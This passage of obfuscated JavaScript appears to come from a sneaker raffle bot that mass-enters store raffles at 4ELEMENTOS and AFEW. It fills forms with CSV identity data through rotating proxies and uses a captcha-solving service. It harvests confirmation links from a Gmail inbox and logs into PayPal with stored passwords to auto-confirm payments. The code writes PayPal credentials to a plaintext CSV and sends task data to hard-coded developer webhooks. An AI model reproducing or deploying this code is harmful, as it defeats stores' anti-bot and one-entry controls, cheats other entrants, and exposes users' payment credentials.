        return _0x904045['Password'] = _0x158ca3['Password'], _0x5a26e1['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x904045['Email'] + ',' + _0x904045['Password'] + ',' + _0x904045['Proxy']), _0x904045;
    }
    let _0x3e3ae4 = await _0x5f25d3();
    var _0x1d576d = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x23c435 = await _0x57218c['get']('Amount'), _0x56aac1 = _0x23c435['Amount'];
    async function _0xb66acf() {
        let _0x185ad1 = 0x0;
        var _0x4f8416 = new _0x27458e({
            'user': _0x64917e['masterMail'],
            'password': _0x64917e['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x312b67(_0x1005a5) {
            _0x4f8416['openBox']('INBOX', ![], _0x1005a5);
        }
        _0x4f8416['once']('ready', function () {
            _0x312b67(function (_0x3406b3, _0x1449b1) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x3406b3)
                    throw _0x3406b3;
                _0x4f8416['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x542ee4, _0x3362e5) {
                    if (!_0x3362e5 || !_0x3362e5['length'])
                        console['log'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20No\x20mails\x20found'), _0x4f8416['end']();
                    else {
                        _0x3362e5 = _0x3362e5['slice'](0x0, _0x56aac1);
                        var _0x5adb2e = _0x4f8416['seq']['fetch'](_0x3362e5, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x5adb2e['on']('message', function (_0x5a5f5b, _0x3f4f2e) {
                            var _0xa39709 = '(#' + _0x3f4f2e + ')\x20';
                            _0x5a5f5b['on']('body', function (_0x2318eb, _0x38a452) {
                                _0x483479(_0x2318eb, (_0x3603a9, _0x5ae799) => {
                                    if (_0x5ae799['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x5ae799['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x5ae799['text']['split']('[')[0x2];
                                        var _0x49ee61 = mes['split'](']')[0x0];
                                        _0x1d576d['push'](_0x49ee61);
                                    }
                                });
                            }), _0x5a5f5b['once']('end', function () {
                                _0x185ad1++;
                            });
                        }), _0x5adb2e['once']('error', function (_0x4ac433) {
                            console['log']('Fetch\x20error:\x20' + _0x4ac433);
                        }), _0x5adb2e['once']('end', function () {
                            _0x4f8416['end']();
                        });
                    }
                });
            });
        }), _0x4f8416['once']('error', function (_0xe9231f) {
            console['log'](_0x17b918['red'](_0xe9231f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x4f8416['once']('end', async function () {
        }), _0x4f8416['connect']();
    }
    try {
        _0xb66acf(), await _0x1a282d(0xfa0), console['log']('Found\x20' + _0x1d576d['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1a282d(0xfa0);
    }
    var _0x374e7a;
    _0x51b97d('' + _0x237178);
    var _0x3e4c5f = _0x3e3ae4['Proxy']['split'](':'), _0x1b19e8;
    try {
        _0x1b19e8 = await _0x506e0b['launch']({
            'userDataDir': 'sessions/' + _0x3e3ae4['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3e4c5f[0x0] + ':' + _0x3e4c5f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x1b19e8 = await _0x506e0b['launch']({
            'userDataDir': 'sessions/' + _0x3e3ae4['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3e4c5f[0x0] + ':' + _0x3e4c5f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20Getting\x20Session');
        const _0x9c82b7 = await _0x1b19e8['newPage']();
        await _0x9c82b7['authenticate']({
            'username': '' + _0x3e4c5f[0x2],
            'password': '' + _0x3e4c5f[0x3]
        }), await _0x9c82b7['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x9c82b7['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x9c82b7['waitForSelector']('#email');
            let _0x17f17b = await _0x9c82b7['$eval']('#email', _0x3259bc => _0x3259bc['getAttribute']('value'));
            if (_0x17f17b == '') {
                await _0x9c82b7['type']('#email', _0x3e3ae4['Email']), await _0x1a282d(0x1d3);
                let _0x56a18d = await _0x9c82b7['$']('#splitPassword');
                _0x56a18d && (await _0x9c82b7['click']('#btnNext'), await _0x1a282d(0xa28)), await _0x9c82b7['type']('#password', _0x3e3ae4['Password']), await _0x1a282d(0x35c), await _0x9c82b7['click']('#btnLogin');
            } else
                await _0x9c82b7['type']('#password', _0x3e3ae4['Password']), await _0x1a282d(0x35c), await _0x9c82b7['click']('#btnLogin');
            await _0x9c82b7['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20Successfully\x20logged\x20in'), await _0x1a282d(0x2710);
        } catch (_0x5001e2) {
            throw new Error('Login\x20session\x20expired\x20' + _0x5001e2);
        }
        for (var _0x4c6386 = 0x0; _0x4c6386 < _0x1d576d['length']; _0x4c6386++) {
            console['log'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20Task\x20' + (_0x4c6386 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x51b97d(_0x237178 + '\x20Task\x20' + (_0x4c6386 + 0x1) + '\x20/\x20' + _0x1d576d['length']);
            const _0x3d57b9 = await _0x1b19e8['newPage']();
            await _0x3d57b9['goto']('' + _0x1d576d[_0x4c6386], { 'waitUntil': 'networkidle2' }), await _0x1a282d(0xbb8);
            try {
                const _0x148e13 = await _0x3d57b9['$']('#challenge-heading');
                _0x148e13 && (console['log'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20Task\x20' + (_0x4c6386 + 0x1) + '\x20:\x20' + _0x17b918['yellow']('2FA\x20Required')), await _0x3d57b9['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x1a282d(0x9c40), await _0x3d57b9['waitForSelector']('#payment-submit-btn'), await _0x3d57b9['$eval']('#payment-submit-btn', _0x5225ff => _0x5225ff['click']()), await _0x3d57b9['click']('#payment-submit-btn');
                try {
                    await _0x3d57b9['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x1a282d(0x5dc), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20Task\x20' + (_0x4c6386 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x1c939f) {
                    _0x1832e1 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x1c939f['message']);
                } finally {
                    if (_0x1832e1 == 'yes' && _0x240fa6 != 0x2) {
                        console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x237178['name'] + ']\x20Task\x20' + (_0x4c6386 + 0x1) + '\x20:\x20Retrying\x20(' + _0x240fa6 + '\x20/\x205)')), _0x4c6386 = _0x4c6386 - 0x1, _0x240fa6 = _0x240fa6 + 0x1;
                        continue;
                    }
                    _0x1832e1 == 'yes' && _0x240fa6 >= 0x2 && (_0x1736ba(csv[_0x4c6386], _0x237178), _0x1832e1 = 'no', _0x240fa6 = 0x0), await _0x3d57b9['close'](), await _0x1a282d(0x4650);
                }
            } catch (_0xfe0cfe) {
                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x237178 + ']\x20Task\x20' + (_0x4c6386 + 0x1) + '\x20:\x20' + _0xfe0cfe));
            }
        }
    } catch (_0x11f7d3) {
        console['log'](_0x17b918['red']('' + _0x11f7d3));
    } finally {
        await _0x1b19e8['close']();
    }
}
const _0x9324de = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0xf98961, _0x24f62a, _0x4fc035) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x276481 = 0x0; _0x276481 < _0x24f62a['length']; _0x276481++) {
                        if (_0x1d10b0 != 'yes')
                            var _0x1d10b0 = '', _0xeb935f = 0x0;
                        var _0x53d45c;
                        try {
                            await _0x120beb(_0x24f62a, _0x276481);
                        } catch {
                            _0x1d10b0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x51b97d(_0xf98961['name'] + '\x20Task\x20' + (_0x276481 + 0x1) + '\x20/\x20' + _0x24f62a['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        var _0x21936e = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x3c9e4b = Math['round'](Math['random']() * (_0x21936e['length'] - 0x1));
                        _0x24f62a[_0x276481]['Size'] == 'RANDOM' && (_0x24f62a[_0x276481]['Size'] = _0x21936e[_0x3c9e4b]);
                        var _0x382d5c = Math['round'](Math['random']() * (_0x4fc035['length'] - 0x1)), _0x33c529 = _0x4fc035[_0x382d5c]['split'](':'), _0x1ec324;
                        try {
                            _0x1ec324 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x33c529[0x0] + ':' + _0x33c529[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1ec324 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x33c529[0x0] + ':' + _0x33c529[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x2d350a = await _0x1ec324['newPage']();
                            await _0x2d350a['authenticate']({
                                'username': '' + _0x33c529[0x2],
                                'password': '' + _0x33c529[0x3]
                            }), await _0x2d350a['setRequestInterception'](!![]), _0x2d350a['on']('request', _0x29017f => {
                                _0x29017f['resourceType']() === 'image' || _0x29017f['resourceType']() === 'font' || _0x29017f['resourceType']() === 'media' ? _0x29017f['abort']() : _0x29017f['continue']();
                            }), await _0x2d350a['goto'](_0x24f62a[_0x276481]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x2d350a['waitForSelector']('#accept-all-gdpr'), await _0x2d350a['click']('#accept-all-gdpr'), await _0x2d350a['waitForSelector']('#raffles-product'), await _0x1a282d(0x3e8), await _0x2d350a['$eval']('#raffles-product', _0x1cdbbc => _0x1cdbbc['click']()), await _0x1a282d(0x1388), await _0x2d350a['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1de885 = await _0x2d350a['$']('.fancybox-inner\x20>\x20iframe'), _0x50a275 = await _0x1de885['contentFrame']();
                            console['log'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x50a275['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x1a282d(0x1f4), await _0x50a275['type']('input[name=\x22sm-form-email\x22]', _0x24f62a[_0x276481]['Email']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-form-name\x22]', _0x24f62a[_0x276481]['FirstName'] + '\x20' + _0x24f62a[_0x276481]['LastName']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-form-street\x22]', _0x24f62a[_0x276481]['Address1'] + '\x20' + _0x24f62a[_0x276481]['HouseNumber'] + '\x20' + _0x24f62a[_0x276481]['Address2']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-form-city\x22]', _0x24f62a[_0x276481]['City']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-form-province\x22]', _0x24f62a[_0x276481]['State']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-form-zip\x22]', _0x24f62a[_0x276481]['Zip']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-form-country\x22]', _0x24f62a[_0x276481]['Country']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-form-phone\x22]', _0x24f62a[_0x276481]['Phone']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x24f62a[_0x276481]['Follower']), await _0x1a282d(0xc8), await _0x50a275['type']('input[name=\x22sm-cst.size\x22]', _0x24f62a[_0x276481]['Size']), await _0x1a282d(0x1f4), await _0x50a275['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x1a282d(0x1f4), await _0x50a275['click']('.icheckbox_simple-custom'), await _0x1a282d(0x1f4), console['log'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x50a275['$eval']('form', _0x51531f => _0x51531f['submit']()), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x1d10b0 = '';
                            var _0x37d265 = await _0x4ee25a(_0x24f62a[_0x276481], _0xf98961, 'dev', ![]), _0x33e049 = await _0x4ee25a(_0x24f62a[_0x276481], _0xf98961, 'pub', ![]);
                            const _0x5b2beb = {
                                'succesDEVMSG': { 'embeds': [_0x37d265] },
                                'succesPUBMSG': { 'embeds': [_0x33e049] }
                            };
                            try {
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x5b2beb['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x5b2beb['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0x1274a5, _0x5b2beb['succesPUBMSG']);
                            } catch (_0x5641bf) {
                                console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5641bf));
                            }
                        } catch (_0x302d16) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20' + _0x302d16)), _0x53d45c = '' + _0x302d16;
                            var _0x5a0f13 = await _0x4ee25a(_0x24f62a[_0x276481], _0xf98961, 'dev', !![], _0x53d45c), _0x37d265 = await _0x4ee25a(_0x24f62a[_0x276481], _0xf98961, 'dev', ![]), _0x33e049 = await _0x4ee25a(_0x24f62a[_0x276481], _0xf98961, 'pub', ![]);
                            const _0x5d4d15 = {
                                'succesDEVMSG': { 'embeds': [_0x37d265] },
                                'succesPUBMSG': { 'embeds': [_0x33e049] }
                            };
                            _0x5d4d15['errorDEV'] = { 'embeds': [_0x5a0f13] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x5d4d15['errorDEV']), await _0x4e4e57(_0x4cd13, _0x5d4d15['errorDEV']), _0x302d16 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1d10b0 = 'yes');
                        } finally {
                            _0x1ec324['close']();
                            if (_0x1d10b0 == 'yes' && _0xeb935f != 0x5 && _0x53d45c != 'Size\x20Not\x20Found') {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Task\x20' + (_0x276481 + 0x1) + '\x20:\x20Retrying\x20(' + _0xeb935f + '\x20/\x205)\x20')), _0x276481 = _0x276481 - 0x1, _0xeb935f = _0xeb935f + 0x1;
                                continue;
                            }
                            _0x1d10b0 == 'yes' && _0xeb935f >= 0x5 && (_0x1736ba(_0x24f62a[_0x276481], _0xf98961), _0x1d10b0 = 'no', _0xeb935f = 0x0), console['log'](_0x5c19a0() + '\x20[' + _0xf98961['name'] + ']\x20Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x315af1, _0x30e4f3) {
                    var _0x34cc34 = [];
                    async function _0x4822d3() {
                        var _0x331873 = new _0x27458e({
                            'user': _0x64917e['masterMail'],
                            'password': _0x64917e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x153d5e(_0x2f52f3) {
                            _0x331873['openBox']('INBOX', ![], _0x2f52f3);
                        }
                        _0x331873['once']('ready', function () {
                            _0x153d5e(function (_0x40dada, _0x1145fe) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x40dada)
                                    throw _0x40dada;
                                _0x331873['seq']['search'](['UNSEEN'], function (_0x1c1bc6, _0x56ef4e) {
                                    if (!_0x56ef4e || !_0x56ef4e['length'])
                                        console['log'](_0x5c19a0() + '\x20[' + _0x315af1['name'] + ']\x20No\x20mails\x20found'), _0x331873['end']();
                                    else {
                                        var _0x3b3a41 = _0x331873['seq']['fetch'](_0x56ef4e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3b3a41['on']('message', function (_0x41ddb2, _0x453916) {
                                            var _0x366d29 = '(#' + _0x453916 + ')\x20';
                                            _0x41ddb2['on']('body', function (_0x188885, _0x26582d) {
                                                _0x483479(_0x188885, (_0x1f2455, _0x224668) => {
                                                    if (_0x224668['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x2ba17b = _0x224668['html']['split']('\x0a');
                                                        for (var _0x8308d9 = 0x0; _0x8308d9 < _0x2ba17b['length']; _0x8308d9++) {
                                                            if (_0x2ba17b[_0x8308d9]['includes']('salesmanago') && _0x2ba17b[_0x8308d9]['includes']('<td') && _0x2ba17b[_0x8308d9]['includes']('href')) {
                                                                var _0x5c6a39 = _0x2ba17b[_0x8308d9]['split']('href=\x22'), _0x2fb15c = _0x5c6a39[0x1]['split']('\x22')[0x0];
                                                                _0x34cc34['push'](_0x2fb15c);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x41ddb2['once']('end', function () {
                                            });
                                        }), _0x3b3a41['once']('error', function (_0x39e46f) {
                                            console['log']('Fetch\x20error:\x20' + _0x39e46f);
                                        }), _0x3b3a41['once']('end', function () {
                                            _0x331873['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x331873['once']('error', function (_0x525b31) {
                            console['log'](_0x17b918['red'](_0x525b31['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x331873['once']('end', async function () {
                        }), _0x331873['connect']();
                    }
                    async function _0x242951(_0x4eea5e, _0x38faee, _0x37b9b5) {
                        for (var _0x13b3ee = 0x0; _0x13b3ee < _0x38faee['length']; _0x13b3ee++) {
                            async function _0x283942(_0x5a58e2, _0x2c8273, _0x1cdf10, _0x2b3591, _0x14f726) {
                                var _0x3ff14c, _0x1f0685 = {}, _0x40d35f = [], _0x4072a5 = {}, _0x284f43 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5d1034 = Math['round'](Math['random']() * (_0x284f43['length'] - 0x1));
                                _0x2b3591[_0x5a58e2]['Size'] == 'RANDOM' && (_0x2b3591[_0x5a58e2]['Size'] = _0x284f43[_0x5d1034]);
                                !_0x2b3591 && (_0x2b3591 = {});
                                if (_0x64917e['useRandomProxy'] = ![])
                                    var _0x495a56 = _0x14f726[_0x5a58e2]['split'](':');
                                else
                                    var _0x3539ae = Math['round'](Math['random']() * (_0x14f726['length'] - 0x1)), _0x495a56 = _0x14f726[_0x3539ae]['split'](':');
                                var _0x3dd9f8 = {
                                    'jar': _0x509c63,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1cdf10['url'],
                                    'headers': _0x1cdf10['headers'],
                                    'body': JSON['stringify'](_0x1f0685),
                                    'proxy': 'http://' + _0x495a56[0x2] + ':' + _0x495a56[0x3] + '@' + _0x495a56[0x0] + ':' + _0x495a56[0x1]
                                };
                                return _0x2c8273 != 'ver' && (_0x3dd9f8['url'] = _0x1cdf10['url'], _0x3dd9f8['headers'] = _0x1cdf10['headers']), _0x2c8273 == 'ver' && (_0x3dd9f8['method'] = 'GET', _0x3dd9f8['url'] = _0x2b3591[_0x5a58e2]), new Promise(function (_0x210bb8, _0x5426cf) {
                                    callback = async (_0x5753fd, _0x5a3bd0, _0x1cefde) => {
                                        if (!_0x5753fd && _0x5a3bd0['statusCode'] == 0xca || !_0x5753fd && _0x5a3bd0['statusCode'] == 0xc8) {
                                            if (_0x2c8273 != 'ver') {
                                                var _0x56cd96 = await _0x4ee25a(_0x2b3591[_0x5a58e2], _0x1cdf10, 'dev', ![]), _0x5abdf1 = await _0x4ee25a(_0x2b3591[_0x5a58e2], _0x1cdf10, 'pub', ![]);
                                                const _0x3b4b7c = {
                                                    'succesDEVMSG': { 'embeds': [_0x56cd96] },
                                                    'succesPUBMSG': { 'embeds': [_0x5abdf1] }
                                                };
                                                if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                                                    try {
                                                        await _0x4e4e57(_0x64917e['webhook'], _0x3b4b7c['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x3b4b7c['succesDEVMSG']), await _0x1a282d(0xc8);
                                                try {
                                                    await _0x4e4e57(_0x1274a5, _0x3b4b7c['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xe19c06(_0x2b3591[_0x5a58e2], _0x1cdf10);
                                            }
                                            _0x210bb8(console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x1cdf10['name'] + ']\x20Task\x20' + (_0x5a58e2 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2c8273 != 'ver') {
                                                var _0xe6e609 = '' + _0x5753fd, _0x25dfc0 = await _0x4ee25a(_0x2b3591[_0x5a58e2], _0x1cdf10, 'dev', !![], _0xe6e609), _0x30efb9 = {};
                                                _0x30efb9['errorDEV'] = { 'embeds': [_0x25dfc0] }, _0x1736ba(_0x2b3591[_0x5a58e2], _0x1cdf10), _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x30efb9['errorDEV']), await _0x4e4e57(_0x4cd13, _0x30efb9['errorDEV']);
                                            }
                                            _0x5426cf(console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1cdf10['name'] + ']\x20Task\x20' + (_0x5a58e2 + 0x1) + ':\x20' + _0x5753fd)));
                                        }
                                    };
                                    try {
                                        _0x2c8273 != 'ver' ? console['log'](_0x5c19a0() + '\x20[' + _0x1cdf10['name'] + ']\x20Task\x20' + (_0x5a58e2 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1f0685['data']['attributes']['email']) : console['log'](_0x5c19a0() + '\x20[' + _0x1cdf10['name'] + ']\x20Task\x20' + (_0x5a58e2 + 0x1) + ':\x20Fetching\x20Response'), _0x2f1368(_0x3dd9f8, callback);
                                    } catch (_0x594010) {
                                        console['log'](_0x5c19a0() + '\x20Task\x20' + (_0x5a58e2 + 0x1) + ':\x20' + _0x594010);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x283942(_0x13b3ee, 'ver', _0x4eea5e, _0x38faee, _0x37b9b5), console['log'](_0x5c19a0() + '\x20[' + _0x4eea5e['name'] + ']\x20Sleeping\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                            } catch (_0x3ad791) {
                            }
                        }
                    }
                    try {
                        _0x4822d3(), await _0x1a282d(0xfa0), console['log']('Found\x20' + _0x34cc34['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x242951(_0x315af1, _0x34cc34, _0x30e4f3);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x449af8, _0x2e329d, _0x4cb0b6) {
                for (var _0x2f65cf = 0x0; _0x2f65cf < _0x2e329d['length']; _0x2f65cf++) {
                    _0x64917e['AfewDelay'] = _0x64917e['delay'];
                    var _0xb30123;
                    if (_0xcb11e3 != 'yes')
                        var _0xcb11e3 = '', _0x5336e3 = 0x0;
                    var _0x2701e4 = _0x2e329d[_0x2f65cf]['Url'], _0x563473 = _0x2e329d[_0x2f65cf];
                    _0x51b97d(_0x449af8['name'] + '\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20/\x20' + _0x2e329d['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                    try {
                        await _0x120beb(_0x2e329d, _0x2f65cf);
                    } catch {
                        _0xcb11e3 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x49f9f6(_0x36a0c3) {
                        const _0x131c2f = _0x5a26e1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x58c663 = _0xdfd901['parse'](_0x131c2f, { 'header': !![] })['data'];
                        let _0x2f526a = ![];
                        for (var _0x4be046 of _0x58c663) {
                            if (_0x4be046['Url'] == _0x36a0c3['Url'] && _0x4be046['Email'] == _0x36a0c3['Email']) {
                                _0x2f526a = !![];
                                break;
                            }
                        }
                        return _0x2f526a;
                    }
                    if (await _0x49f9f6(_0x2e329d[_0x2f65cf]) == !![]) {
                        console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x61a316 = await _0x4ee25a(_0x2e329d[_0x2f65cf], _0x449af8, 'dev', ![]), _0x57b55a = await _0x4ee25a(_0x2e329d[_0x2f65cf], _0x449af8, 'pub', ![]);
                    const _0x50ebbd = {
                        'succesDEVMSG': { 'embeds': [_0x61a316] },
                        'succesPUBMSG': { 'embeds': [_0x57b55a] }
                    };
                    if (_0x2e329d[_0x2f65cf]['Email'] == '' || _0x2e329d[_0x2f65cf]['FirstName'] == '' || _0x2e329d[_0x2f65cf]['LastName'] == '' || _0x2e329d[_0x2f65cf]['Country'] == '' || _0x2e329d[_0x2f65cf]['Size'] == '' || _0x2e329d[_0x2f65cf]['Address1'] == '' || _0x2e329d[_0x2f65cf]['Zip'] == '') {
                        console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x64917e['useRandomProxy'] = ![])
                        var _0x4caaf = _0x4cb0b6[_0x2f65cf]['split'](':');
                    else
                        var _0x59364f = Math['round'](Math['random']() * (_0x4cb0b6['length'] - 0x1)), _0x4caaf = _0x4cb0b6[_0x59364f]['split'](':');
                    var _0x1a06d3;
                    try {
                        _0x1a06d3 = await _0x506e0b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4caaf[0x0] + ':' + _0x4caaf[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1a06d3 = await _0x506e0b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4caaf[0x0] + ':' + _0x4caaf[0x1],
                                '--no-sandbox',
